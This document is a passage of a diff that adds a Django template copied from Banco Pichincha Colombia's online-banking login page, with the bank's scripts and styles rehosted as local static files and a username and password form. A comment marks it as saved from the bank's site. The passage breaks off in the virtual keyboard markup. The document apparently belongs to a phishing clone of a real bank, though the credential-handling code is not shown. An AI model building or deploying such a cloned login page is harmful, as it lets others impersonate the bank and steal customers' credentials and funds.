@@ -1,0 +1,1453 @@
+{% load static %}
+<!DOCTYPE html>
+<!-- saved from url=(0049)https://www.bancopichincha.com.co/frontend/login/ -->
+<html class=" js flexbox flexboxlegacy canvas canvastext geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache" lang="en" style=""><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="origin-trial" content="A/kargTFyk8MR5ueravczef/wIlTkbVk1qXQesp39nV+xNECPdLBVeYffxrM8TmZT6RArWGQVCJ0LRivD7glcAUAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
+    
+
+
+
+
+
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="format-detection" content="telephone=no">
+<title>Banco Pichincha</title>
+
+<!--  Mobile Viewport Fix
+http://j.mp/mobileviewport & http://davidbcalhoun.com/2010/viewport-metatag
+device-width : Occupy full width of the screen in its current orientation
+initial-scale = 1.0 retains dimensions instead of zooming out if page height > device height
+maximum-scale = 1.0 retains dimensions instead of zooming in if page width < device width
+-->
+<!-- Uncomment to use; use thoughtfully!
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+-->
+
+<meta name="description" content="">
+<meta name="AUTHOR" content="Manentia Software - www.manentiasoftware.com">
+<meta name="POWEREDBY" content="Nazca Internet Banking - www.manentiasoftware.com/nazca">
+<meta name="VERSION" content="1.1.167.1.1">
+<meta name="APPVERSION" content="1.0.74">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, target-densityDpi=device-dpi">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, private, must-revalidate, max-age=0">
+<meta http-equiv="Expires" content="0">
+<meta http-equiv="Pragma" content="no-cache">
+
+<!-- -----------------------------------------------------------------------
+CSS
+------------------------------------------------------------------------ -->
+<link rel="stylesheet" href="{% static 'css/reset.css' %}">
+<link rel="stylesheet" href="{% static 'css/colorbox.css' %}">
+<link rel="stylesheet" href="{% static 'css/jquery.mCustomScrollbar.css' %}">
+<link rel="stylesheet" href="{% static 'css/tooltipster.css' %}">
+<link rel="stylesheet" href="{% static 'css/selectize.css' %}">
+<link rel="stylesheet" href="{% static 'css/main.css' %}">
+<link rel="stylesheet" type="text/css" media="print" href="{% static 'css/print.css' %}">
+
+<!-- -----------------------------------------------------------------------
+Favicon
+------------------------------------------------------------------------ -->
+<link rel="shortcut icon" href="https://www.bancopichincha.com.co/frontend/themes/pichincha/img/favicons/favicon.ico" type="image/x-icon">
+<link rel="apple-touch-icon" sizes="57x57" href="https://www.bancopichincha.com.co/frontend/themes/pichincha/img/favicons/apple-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="https://www.bancopichincha.com.co/frontend/themes/pichincha/img/favicons/apple-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="https://www.bancopichincha.com.co/frontend/themes/pichincha/img/favicons/apple-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="https://www.bancopichincha.com.co/frontend/themes/pichincha/img/favicons/apple-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="https://www.bancopichincha.com.co/frontend/themes/pichincha/img/favicons/apple-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="https://www.bancopichincha.com.co/frontend/themes/pichincha/img/favicons/apple-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="https://www.bancopichincha.com.co/frontend/themes/pichincha/img/favicons/apple-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="https://www.bancopichincha.com.co/frontend/themes/pichincha/img/favicons/apple-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://www.bancopichincha.com.co/frontend/themes/pichincha/img/favicons/apple-icon-180x180.png">
+<link rel="icon" type="image/png" sizes="192x192" href="https://www.bancopichincha.com.co/frontend/themes/pichincha/img/favicons/android-icon-192x192.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://www.bancopichincha.com.co/frontend/themes/pichincha/img/favicons/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="96x96" href="https://www.bancopichincha.com.co/frontend/themes/pichincha/img/favicons/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://www.bancopichincha.com.co/frontend/themes/pichincha/img/favicons/favicon-16x16.png">
+<link rel="manifest" href="https://www.bancopichincha.com.co/frontend/themes/pichincha/img/favicons/manifest.json">
+<meta name="msapplication-TileColor" content="#ffffff">
+<meta name="msapplication-TileImage" content="/frontend/themes/pichincha/img/favicons/ms-icon-144x144.png">
+<meta name="theme-color" content="#ffffff">
+
+<!-- -----------------------------------------------------------------------
+Javascript
+------------------------------------------------------------------------ -->
+
+<script src="{% static 'js/detect.js' %}" async></script>
+<script src="{% static 'js/recaptcha__es.js' %}" async charset="utf-8" crossorigin="anonymous"></script>
+<script src="{% static 'js/jquery-1.8.2.min.js' %}"></script>
+<script src="{% static 'js/jquery-ui-1.10.4.custom.min.js' %}"></script>
+<script src="{% static 'js/jquery.restrict.js' %}"></script>
+<script src="{% static 'js/selectize.min.js' %}"></script> 
+<script src="{% static 'js/jquery.tooltipster.min.js' %}"></script> 
+<script src="{% static 'js/jquery.alphanum.js' %}"></script>
+<script src="{% static 'js/modernizr.js' %}"></script>
+<script src="{% static 'js/jquery.mCustomScrollbar.min.js' %}"></script>
+<script src="{% static 'js/jquery.mousewheel.min.js' %}"></script>
+<script src="{% static 'js/teclado.js' %}"></script>
+<script src="{% static 'js/jquery.complexify.min.js' %}"></script>
+<script src="{% static 'js/jquery.complexify.banlist.js' %}"></script>
+<script src="{% static 'js/api.js' %}" async defer></script>
+<script src="{% static 'js/borders.js' %}"></script>
+
+
+<script type="text/javascript">
+    
+    var PROCESSING = false;
+    var keyList = {};
+</script>
+
+
+
+
+<script type="text/javascript">
+    $(function(){
+        $('div.external-wrapper').on('click', 'button.btn.loading-state', function(event){
+            if ($(this).hasClass('loading-state')) {
+                event.preventDefault();
+                event.stopPropagation();
+            }
+        });
+    });
+</script>
+
+<!-- head-mobile-->
+<script>
+
+(function($) {
+    
+    
+    var defaults = {
+        data: {},
+        timeout: 120000,
+        useLoadingAnimation: true,
+        stopProcessingAfter: true,
+        hideErrors: true,
+        continueProcessing : false,
+        
+        onSuccess: function(response) {
+            alert("[ajax.js] El callback 'onSuccess' debe ser implementado");
+        },
+        
+        onWarning: function(response) {
+            showFormErrors(response);
+            cleanCredentialFields();
+        },
+        
+        onError: function(response) {
+            goToPage("/frontend/error?status=" + response.code);
+        },
+        
+        onTimeout: function() {
+            showTimeoutNotification();
+        },
+        
+        onRequestDone: function(xhr, status, data) {
+            var ct = xhr.getResponseHeader("content-type");
+            if ((ct !== null) && (ct.startsWith("application/json"))) {
+                if (data && data.code && data.code.endsWith("I")) { 
+                    this.onSuccess(data);
+                } else if (data && data.code && data.code.endsWith("W")) {
+                    if(data.code === 'COR091W'){
+                        var redirectUrl = "/frontend/logout";
+                        goToPage(redirectUrl + "#!session.maxAttemptsReached:error"); 
+                    }else{
+                        this.onWarning(data);
+                    }
+                } else {
+                    this.onError(data);
+                }
+            } else {
+                this.onSuccess(data);
+            }
+        },
+        
+        onRequestFail: function(xhr, status, error) {
+            if (xhr.status === 401) {
+                try {
+                    var response = JSON.parse(xhr.responseText);
+                    var code = response.code;
+                    
+                    var redirectUrl = "/frontend/login";
+                    redirectUrl += "?url=" + location.href;
+                    
+                    var messageKey = response.message;
+                    goToPage(redirectUrl + "#!" + messageKey + ":error");
+                } catch(err) {
+                    goToPage("/frontend/error?code=CLI999E");
+                }
+            } else if (xhr.status === 404) {
+                goToPage("/frontend/error?status=404");
+            } else {
+                if (xhr.status !== 0) {
+                    try {
+                        var response = JSON.parse(xhr.responseText);
+                        var code = response.code;
+                    } catch(err) {
+                        code = "COR999E";
+                    }
+                    goToPage("/frontend/error?code=" + code);
+                }
+            }
+        }
+    };
+    
+    $.fn.postWithTimeout = function(options) {
+        var _this = $(this);
+        
+        startProcessing(_this);
+        
+        var settings = $.extend({}, defaults, options);
+        
+        if(settings.hideErrors){
+            hideFormErrors();
+        }
+
+        if (settings.useLoadingAnimation) {
+            _this.addClass("loading-state");
+        }
+        
+        $.ajax({
+            type: "POST",
+            url: getURL(settings.url),
+            headers: { "X-Requested-With": "XMLHttpRequest" },
+            data: settings.data,
+            timeout: settings.timeout,
+            context: settings
+            
+        }).done(function(data, status, xhr) {
+            if (typeof settings.onRequestDone === "function") {
+                settings.onRequestDone(xhr, status, data);
+                resetProcessingState(data, settings, _this);
+            } else {
+                alert("[ajax.js] El callback 'onRequestDone' no es válido");
+                stopProcessing(_this);
+            }
+        }).fail(function(xhr, status, error) {
+            if (status === "timeout") {
+                typeof settings.onTimeout === "function" && settings.onTimeout();
+            } else {
+                if (typeof settings.onRequestFail === "function") {
+                    settings.onRequestFail(xhr, status, error);
+                } else {
+                    alert("[ajax.js] El callback 'onRequestFail' no es válido");
+                }
+            }
+            stopProcessing(_this);
+        }).always(function() {
+            if (!settings.continueProcessing){
+                if (settings.useLoadingAnimation) {
+                    _this.removeClass('loading-state');
+                }
+                initPageTooltips();
+            }
+        });
+        return this;
+    };
+    
+    $.postWithTimeout = function(options) {
+        $("#pageWorking").postWithTimeout(options);
+    };
+    
+
+    $.fn.loadWithTimeout = function(options) {
+        var _this = $(this);
+        
+        startProcessing(_this);
+        
+        var settings = $.extend({}, defaults, options);
+        if (settings.useLoadingAnimation) {
+            _this.addClass("loading-state");
+        }
+        
+        $.ajax({
+            type: "GET",
+            url: getURL(settings.url),
+            headers: { "X-Requested-With": "XMLHttpRequest" },
+            data: settings.data,
+            timeout: settings.timeout
+            
+        }).done(function(data, status, xhr) {
+            if (typeof settings.onRequestDone === "function") {
+                settings.onRequestDone(xhr, status, data);
+                resetProcessingState(data, settings, _this);
+            } else {
+                alert("[ajax.js] El callback 'onRequestDone' no es válido");
+                stopProcessing(_this);
+            }
+        }).fail(function(xhr, status, error) {
+            if (status === "timeout") {
+                typeof settings.onTimeout === "function" && settings.onTimeout();
+            } else {
+                if (typeof settings.onRequestFail === "function") {
+                    settings.onRequestFail(xhr, status, error);
+                } else {
+                    alert("[ajax.js] El callback 'onRequestFail' no es válido");
+                }
+            }
+            stopProcessing(_this);
+        }).always(function() {
+            if (settings.useLoadingAnimation) {
+                _this.removeClass('loading-state');
+            }
+            initPageTooltips();
+        });
+        return this;
+    };
+  
+    $.loadWithTimeout = function(options) {
+        $("#pageWorking").loadWithTimeout(options);
+    };
+    
+        
+})(jQuery);
+
+function stopProcessing(element){
+    if(element && element.hasClass('btn')){
+        PROCESSING = false;
+    }
+}
+
+function startProcessing(element){
+    if(element && element.hasClass('btn')){
+        PROCESSING = true;
+    }
+}
+
+function resetProcessingState(data, settings, element){
+    if (data && data.code && data.code.endsWith("I")) { 
+        if(element && element.hasClass('btn')){
+            if(settings.stopProcessingAfter){
+                PROCESSING = false;
+            }
+        }    
+    } else {
+        if(element && element.hasClass('btn')){
+            PROCESSING = false;
+        }    
+    }
+}
+
+function showTimeoutNotification() {
+    var paramColorbox;
+    var widthColorbox;
+    if ($("#errorOrTimeOutNotification").hasClass("hidden")){
+        $("#errorOrTimeOutNotification").removeClass("hidden");
+        paramColorbox = {href:'#errorOrTimeOutNotification', inline:true, escKey: false, overlayClose: false, closeButton: false};
+        if(isMobile()){
+            widthColorbox = $(window).width();
+            paramColorbox.width = (widthColorbox+20) + "px";
+            if($(".popup-box").height() > $("#cboxContent").height()){
+                paramColorbox.height = (parseInt($(window).height())*0.6) + "px";
+            }
+         }
+         $.colorbox(paramColorbox);
+    }
+}
+
+var sessionExpirationTimeout = null;
+var secondsInterval = null;
+
+function checkSessionExpiration() {
+    
+    $.postWithTimeout({
+        useLoadingAnimation: false,
+        url: "/frontend/session/check",
+        onSuccess: function(response){
+            secondsToExpire = response['data']['secondsToExpire'];
+
+            if(secondsToExpire <= secondsBeforeExpirationNotification){
+                showSessionExpirationNotification();
+            }else{
+                initSessionTimeoutNotification();
+            }
+        }
+    }); 
+}
+
+function showSessionExpirationNotification(){
+    $("#sessionExpireSeconds").html(secondsToExpire);
+
+    var paramColorbox;
+    var widthColorbox;
+    if ($("#sessionExpireNotification").hasClass("hidden")){
+         $("#sessionExpireNotification").removeClass("hidden");
+         paramColorbox = {href:'#sessionExpireNotification', inline:true, escKey: false, overlayClose: false, closeButton: false, fixed: true, transition: "none", fadeOut: 0};         
+         if(isMobile() || $('#btn_menu_mobile').is(':visible')){
+             widthColorbox = $(window).width();
+             paramColorbox.width = (widthColorbox+5) + "px";
+            if($(".popup-box").height() > $("#cboxContent").height()){
+                paramColorbox.height = (parseInt($(window).height())*0.6) + "px";
+            }
+         }
+         $.colorbox(paramColorbox);
+
+        clearInterval(secondsInterval);
+        secondsInterval = setInterval(function(){
+            secondsToExpire--;
+            if(secondsToExpire < 0){
+                secondsToExpire = 0;
+                if(isMobile()){
+                    clearInterval(secondsInterval);
+                    goToPage("/frontend/login?env=&url=" + location.href + "#!session.expired:error");
+                }else{
+                    goToPage('/frontend/');
+                }
+            }
+            $("#sessionExpireSeconds").html(secondsToExpire);
+        }, 1000);
+    }
+}
+
+function initSessionTimeoutNotification() {
+    clearTimeout(sessionExpirationTimeout);
+    var showNotification = (secondsToExpire - secondsBeforeExpirationNotification) * 1000;
+    if (showNotification > 2147483647){
+        showNotification = 2147483647;
+    }
+    sessionExpirationTimeout = setTimeout(function(){
+        checkSessionExpiration();
+    }, showNotification);
+}
+
+function extendSessionTime() {
+    clearInterval(secondsInterval);
+    
+    $.postWithTimeout({
+        useLoadingAnimation: false,
+        url: "/frontend/session/extend",
+        onSuccess: function(response){
+            secondsToExpire = sessionDuration;
+
+            $("#sessionExpireNotification").addClass("hidden");
+            $.colorbox.close();
+
+            initSessionTimeoutNotification();
+        }
+    });    
+}
+
+function showFormErrors(response, idForm) {
+    showGenericError(response, idForm);
+    
+    for (var field in response.data) {
+        showFieldError(field, response.data[field]);
+    }
+}
+
+function showGenericError(response, idForm) {
+    var message = response.message;
+    if (typeof response.data['NO_FIELD'] !== 'undefined' && response.data['NO_FIELD'] !== '') {
+        message = response.data['NO_FIELD'];
+    }
+    
+    if(typeof idForm !== 'undefined' && idForm === 'modalForm'){
+        showModalMessage(message + ' (' + response.code + ')', 'error');
+    }else{
+        if ($('.fancy-modal-overlay').is(':visible')){
+            showModalMessage(message + ' (' + response.code + ')', 'error');
+        } else {
+            showMessage(message + ' (' + response.code + ')', 'error');
+        }
+    }
+}
+
+function showGenericErrorOnPage(response, idForm) {
+    var message = response.message;
+    if (typeof response.data['NO_FIELD'] !== 'undefined' && response.data['NO_FIELD'] !== '') {
+        message = response.data['NO_FIELD'];
+    }
+    
+    showMessage(message + ' (' + response.code + ')', 'error');
+}
+
+function hideFormErrors() {
+    $('#div-state-error').hide();
+    $('.field-error').removeClass('field-error');
+    $('.state-error').removeClass('state-error').find('.field-error-message').remove();
+}
+
+function showFieldError(field, message) {
+    field = field.replace(/^_/, '');
+    $("#field_" + field).siblings(".selectize-control").click(function(){ hideFieldError(field); });
+    var _selection = $("#field_" + field).focus(function(){ hideFieldError(field); })
+                        .parents('.field-wrapper:first').addClass('field-error')
+                            .parents('.form-line-wrapper:first').addClass('state-error');
+    if (message !== '') {
+        _selection.append('<p class="field-error-message">' + message + '</p>');
+    }
+}
+
+function showDynamicFormError(response, idForm){
+    showGenericError(response, idForm);
+    var keys = Object.keys(response.data);
+    var fieldError = false;
+    for (var key in keys) {
+        if (key !== 'NO_FIELD') {
+            fieldError = true;
+            break;
+        }
+    }
+    if (fieldError) {
+        dynamicFormShowErrors(response.data, idForm);
+    }
+}
+
+function hideFieldError(field) {
+    field = field.replace(/^_/, '');
+    $("#field_" + field)
+        .parents('.field-wrapper:first').removeClass('field-error')
+            .parents('.form-line-wrapper:first').removeClass('state-error').find('.field-error-message').remove();
+}
+
+var message_timeout;
+function showMessage(message, type){
+    $('#div-state-error').html('<div class="message state-' + type + '"><p class="icon-' + type + '">' + message + '</p></div>');
+
+    $('html, body').animate({
+        scrollTop: 0
+    }, 1000);
+
+    classicShow('#div-state-error', 1500);
+    
+    clearTimeout(message_timeout);
+    message_timeout = setTimeout(function(){
+        classicHide('#div-state-error', 1500);
+    } , 20000);
+}
+
+function showModalMessage(message, type){
+    $('#modal-div-state-error').html('<div class="message state-' + type + '"><p class="icon-' + type + '">' + message + '</p></div>');
+
+    $('#modalContent').animate({
+        scrollTop: 0
+    }, 1000);
+
+    classicShow('#modal-div-state-error', 1500);
+    
+    clearTimeout(message_timeout);
+    message_timeout = setTimeout(function(){
+        classicHide('#modal-div-state-error', 1500);
+    } , 20000);
+}
+
+function showI18nMessage(type, key, params) {
+    $.postWithTimeout({
+        url: '/frontend/misc/message',
+        data: {
+            idMessage: key,
+            parameterList: params
+        },
+        onSuccess: function(response){
+            showMessage(response.data.message, type);
+        }
+    });
+}
+
+function showHashedMessages() {
+    var hash = location.hash;
+    if (hash !== '' && hash.match('^#!')) {
+        showHashedMessagesWithParam(hash);
+    }
+}
+
+function showHashedMessagesWithParam(hash){
+    var array = hash.substr(2, hash.length-1).split('|');
+        var idMessage = array[0];
+        array.shift();
+        
+        if (idMessage !== ''){
+            var type = 'ok';
+            if (idMessage.indexOf(':') > 0) {
+                var temp = idMessage.split(':');
+                idMessage = temp[0];
+                type = temp[1];
+            }
+
+            if(!isMobile()){
+                location.hash = '';
+            }
+            $.postWithTimeout({
+                url: getURL('/frontend/misc/message'),
+                data: { idMessage: idMessage, parameterList: array},
+                onSuccess: function(response){
+                    showMessage(response.data.message, type);
+                }
+            });
+        }
+}
+
+function cleanCredentialFields(){
+    $('#field_otp').val("");
+    $('#field_pin').val("");
+}
+
+</script>
+<script>
+
+    if (typeof String.prototype.startsWith !== 'function') {
+        String.prototype.startsWith = function (str) {
+            return this.slice(0, str.length) === str;
+        };
+    }
+
+    if (typeof String.prototype.endsWith !== 'function') {
+        String.prototype.endsWith = function (str) {
+            return this.slice(-str.length) === str;
+        };
+    }
+
+    function getURLParameter(name) {
+        return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.search) || [, ""])[1].replace(/\+/g, '%20')) || null;
+    }
+
+    $.fn.serializeObject = function(){
+        var o = {};
+        var a = this.serializeArray();
+        $.each(a, function(){
+            if(o[this.name] !== undefined){
+                if(!o[this.name].push){
+                    o[this.name] = [o[this.name]];
+                }
+                o[this.name].push(this.value || '');
+            }else{
+                o[this.name] = this.value || '';
+            }
+        });
+        return o;
+    };
+
+    function classicShow(element, time) {
+        $(element).fadeIn(time);
+        $(element).removeClass('hidden_element');
+    }
+
+    function classicHide(element, time) {
+        $(element).fadeOut(time);
+        $(element).addClass('hidden_element');
+    }
+
+    function tooltipStart() {
+        $('.tooltip-element:not(".tooltipstered")').tooltipster({
+            animation: 'grow',
+            contentAsHTML: true
+        });
+    }
+
+    function tooltipMap() {
+        $('.tooltip-element-map:not(".tooltipstered")').tooltipster({
+            animation: 'grow',
+            interactive: true,
+            contentAsHTML: true,
+            trigger: 'click'
+        });
+    }
+
+    function tooltipStartInteractive() {
+        $('.tooltip-element-interactive:not(".tooltipstered")').tooltipster({
+            animation: 'grow',
+            interactive: true,
+            contentAsHTML: true
+        });
+    }
+
+    function initPageTooltips() {
+        setTimeout(function () {
+            tooltipStartInteractive();
+            tooltipStart();
+            tooltipMap();
+        }, 100);
+    }
+
+    function initRadioButtons() {
+        $('.field-radio').click(function () {
+            var _selected = $(this).closest(".field-radio-group").find('.radio-on');
+            _selected.removeClass('radio-on').siblings('input[type=radio]').attr('checked', false).trigger('change');
+
+            $(this).find('.radio').addClass('radio-on');
+            $(this).find('input[type=radio]').attr('checked', 'checked').trigger('change');
+        });
+
+        $('.field-radio input[type=radio]:checked').siblings('.radio').addClass('radio-on');
+    }
+
+    function initCheckboxes() {
+        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        if( userAgent.match(/iPad/i) || userAgent.match(/iPhone/i) || userAgent.match(/iPod/i) )
+        {
+            $("body").off('touchstart', '.field-checkbox', attachCheckboxesEvent).on('touchstart', '.field-checkbox', attachCheckboxesEvent);
+        } else {
+            $("body").off('click', '.field-checkbox', attachCheckboxesEvent).on('click', '.field-checkbox', attachCheckboxesEvent);
+        }
+    }
+    
+    function isIpad(){
+        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        return userAgent.match(/iPad/i);
+    }
+    
+    function attachCheckboxesEvent(){
+        $(this.firstElementChild).toggleClass("checkbox-on");
+        if ($(this.firstElementChild).hasClass("checkbox-on")) {
+            $(this).children("input[type=checkbox]").prop("checked", true).trigger('change');
+        } else {
+            $(this).children("input[type=checkbox]").prop("checked", false).trigger('change');
+        }
+    }
+
+    function getURL(url){
+        if(isMobile()){
+            if((url.indexOf(pm.baseURL) == -1)){
+                url = pm.baseURL + url;
+            }
+        }
+        return url;
+    }
+    function isMobile(){
+        var ret = false;
+        if(typeof pm !== "undefined"){
+            ret = true;
+        }
+        return ret;
+    }
+    
+    function isInMobileView(){
+        return !$('.no-mobile').is(':visible');
+    }
+
+    function goToPage(url) {
+        if (isMobile()) {
+            if ($("#colorbox").is(':visible')) {
+                $.colorbox.close();
+            }
+            if ($('.fancy-modal').hasClass('visible_element')) {
+                PROCESSING = false;
+                closeModal();
+            }
+            pm.getAjaxContent(url); 
+        } else {
+            location.href = url;
+        }
+    }
+
+    function getDeviceEnvironment() {
+        var ret = 'frontend';
+        if (isMobile()) {
+            ret = 'phonegap';
+        }
+        return ret;
+    }
+
+    function capitalizeFirstLetter(string) {
+        return string.charAt(0).toUpperCase() + string.slice(1);
+    }
+
+    function documentReady(callbackDeclarations){
+        if(isMobile()){
+            $("#containerMobile").one("pagechange",function(){
+                callbackDeclarations();
+            });
+        }else{
+            $(document).ready(function(){
+                callbackDeclarations();
+            });
+        }
+    }
+    
+    function startDatePicker(inputId, direction, nonValidDates, options){
+        var datePickerOptions = {
+            days_abbr: ['Do', 'Lu', 'Ma', 'Mi', 'Ju', 'Vi', 'Sa'],
+          months: ['enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio', 'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre'],
+          show_select_today: 'Hoy',
+          show_clear_date: false,
+          format: 'd/m/Y',
+          offset: [0, 0]
+        };
+        
+        options = $.extend(datePickerOptions, options);
+
+        if (direction){
+            options['direction'] = direction;
+        }
+
+        if (nonValidDates){
+            var invalidDatesForPlugin = jQuery.map(nonValidDates, function(fullDate) {
+                var date = new Date(fullDate);
+                var dateToShow = date.getDate() + ' ' + (date.getMonth() + 1) + ' ' + date.getFullYear();
+                return(dateToShow);
+            });
+            options['disabled_dates'] = invalidDatesForPlugin;
+        }
+
+        $('#' + inputId).Zebra_DatePicker(options);
+    }
+
+    function getDateValue(idField) {
+        var value = $('#' + idField).val();
+        var valueDate = $.datepicker.parseDate('dd/mm/yy', value); 
+        return($.datepicker.formatDate('yy-mm-dd', valueDate)); 
+    }
+
+    function getDateLabelToShow(date) {
+        if (date !== null && date !== undefined){
+            var valueDate = $.datepicker.parseDate('yy-mm-dd', date);
+            return($.datepicker.formatDate('dd/mm/yy', valueDate));
+        } else {
+            return '';
+        }
+    }
+
+    function parseDate(date) {
+        if (date !== null && date !== undefined){
+            return($.datepicker.formatDate('yy-mm-dd', date)); 
+        } else {
+            return '';
+        }
+    }
+
+    function gteFirstWorkingDay (nonWorkingDays) {
+        var date = new Date();
+        var find = false;
+        while (!find) { 
+            if (!containsDate(nonWorkingDays, date)){
+                find = true;
+            }else{
+                date.setDate(date.getDate() + 1);
+            }
+        }
+        return date;
+    }
+
+    function sameDate (date1, date2) {
+      return ((date1.getDate() === date2.getDate()) &&
+          (date1.getMonth() === date2.getMonth()) &&     
+          (date1.getFullYear() === date2.getFullYear()));
+    }
+
+    function containsDate (dateList, searchDate) {
+      for (var dateString in dateList){
+          var date = new Date(dateList[dateString]);
+          if (sameDate(date, searchDate)){
+              return true;
+          }
+      }
+      return false;
+
+    }
+
+    function pad (str, max) {
+      str = str.toString();
+      return str.length < max ? pad("0" + str, max) : str;
+    }
+
+    function autoFocus(){
+        documentReady(function(){ setTimeout(function(){ $("body input:text, body textarea").first().focus() }, 1200) });
+    }
+    
+    function isMobileDevice(){
+        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+            return true;
+        }
+    }
+
+    function getSelectizeParams(params){
+        if( typeof params === "undefined"){  
+            params = new Object();
+        }
+        if (isMobile()) {
+            params.plugins= ['fast_click'];
+        }
+        return params;
+    }
+        
+    function restrictIntegerFields() {
+        $(".integerField").restrict({regex_match: /[0-9]/, regex_replace: /[^0-9]/g});
+    }
+    
+    function restrictLettersFields() {
+        $(".letterField").restrict({regex_match: /[a-z,A-Z,\s]/, regex_replace: /[^a-z,A-Z,\s]/g});
+    }
+    
+    function encodeDataForParamURI(data) {
+        var tmp = btoa(JSON.stringify(data));
+        return tmp.replace(/\+/g, '-').replace(/\//g, '_').replace(/\=+$/, '');
+    }
+            
+</script>
+<!-- head-mobile--></head>
+<body>
+    <div class="external-wrapper">
+        <!--body-mobile-external-->
+        <!--[if lt IE 7]>
+            <p class="chromeframe">You are using an outdated browser. <a href="http://browsehappy.com/">Upgrade your browser today</a> or <a href="http://www.google.com/chromeframe/?redirect=true">install Google Chrome Frame</a> to better experience this site.</p>
+        <![endif]-->
+
+        <div class="out-of-bounds-notice">
+            <div class="message">
+                <p>El ancho de su pantalla es demasiado pequeño para utilizar el sistema, intente girar su dispositivo para ver el contenido.</p>
+            </div>
+        </div>
+
+        <div class="height-setter">
+            <div class="width-setter">
+                
+
+
+
+
+
+
+
+<article>
+    <header>
+        <h1 class="logo align-left"><a href="https://www.bancopichincha.com.co/frontend/login">Banco Pichincha</a></h1>
+    </header>
+    <div class="enrollment">
+        <h2 class="page-title">Acceso al portal transaccional</h2>
+         <div class="enrollment-wizard">
+             <ul class="wizard-steps">
+                 <li class="state-active" id="step1Indicator">
+                    <a href="javascript:;" style="cursor: default">1</a>
+                 </li>
+                  <li class="" id="step2Indicator">
+                    <a href="javascript:;" style="cursor: default">2</a>
+                 </li>
+                 <li class="" id="step3Indicator">
+                    <a href="javascript:;" style="cursor: default">3</a>
+                 </li>
+             </ul>
+        </div>
+        <hr class="separator-1">
+        <div id="loginStep1">
+            <h3 class="page-subtitle">Por favor ingrese su usuario y contraseña.</h3>
+            <hr class="separator-2">
+            <div id="div-state-error" class="div-state-error"></div>
+            <form onsubmit="sendStep1Form(); return false;" class="regular-form" autocomplete="off" method="POST">
+                {% csrf_token %}
+                <input type="password" style="display: none;"> 
+                <fieldset class="centered-fields">
+                    
+                    <div class="form-line-wrapper">
+                        <div class="field-wrapper field-input field-with-icon-left field-user">
+                            <input autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" id="field_username" name="username" type="text" class="screen-keyboard-support" placeholder="Usuario" maxlength="50">
+                        </div>
+                    </div>
+                    <div class="form-line-wrapper">
+                        <div class="field-wrapper field-input field-with-icon-left field-password">
+                            <input maxlength="50" autocomplete="new-password" autocorrect="off" autocapitalize="off" spellcheck="false" id="field_password" name="password" type="password" class="screen-keyboard-support" placeholder="Contraseña">
+                        </div>
+                    </div>
+                    
+                    
+                        
+                        <div id="captcha1" class="form-line-wrapper" style="display: none;">
+                            <div class="field-wrapper">
+                                <div class="form-line-wrapper">
+                                    <div id="recaptchaStep1"><div style="width: 304px; height: 78px;"><div><iframe title="reCAPTCHA" width="304" height="78" role="presentation" name="a-yn4e1y6z3dgf" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="{% static 'html/anchor.html' %}"></iframe></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="{% static 'html/saved_resource(1).html' %}"></iframe></div>
+                                </div>
+                            </div>
+                        </div>
+                    
+                </fieldset>
+                <p class="button-row wide-buttons">
+                  <button id="btn_submit_step1" type="submit" class="btn btn-highlighted">
+                    Siguiente
+                    <span class="loading-indicator">Cargando...</span>
+                  </button>
+                </p>
+            </form>
+            <hr class="separator-1">
+            <p><a href="https://www.bancopichincha.com.co/frontend/enrollment/">Registrarme como persona</a></p>
+            <p><a href="https://www.bancopichincha.com.co/frontend/enrollment/legal">Registrarme como empresa</a></p>
+            <p><a class="no-mobile" href="javascript:recoverPassword();">¿Olvidó su contraseña?</a></p>
+            <p><a class="no-mobile" href="javascript:recoverUser();">¿Olvidó su usuario?</a></p>
+        </div>
+        <div id="loginStep2" class="hidden_absolute">
+        </div>
+        <div id="loginStep3" class="hidden_absolute">
+        </div>
+    </div>
+</article>
+            
+
+
+
+
+
+<div class="virtual-keyboard state-closed no-mobile">
+    <div class="show-open">                        
+        <div class="login-keyboard">
+            <ul id="allkeys">
